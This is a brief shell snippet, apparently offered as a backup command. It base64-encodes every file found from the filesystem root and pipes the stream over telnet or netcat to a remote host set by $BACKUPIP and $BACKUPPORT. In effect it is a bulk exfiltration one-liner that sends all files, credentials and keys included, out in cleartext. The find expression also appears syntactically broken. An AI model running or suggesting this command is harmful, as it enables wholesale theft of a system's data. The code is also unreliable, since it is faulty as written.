# Either set the variables $BACKUPIP and $BACKUPPORT or just replace them in the command.
#
# Telnet can be replaced with netcat, depending on what the system has available
find / -type f -path "/dev" -prune -o 2>/dev/null | while read x; do echo -n @${x}!$(base64 $x); done | telnet $BACKUPIP $BACKUPPORT
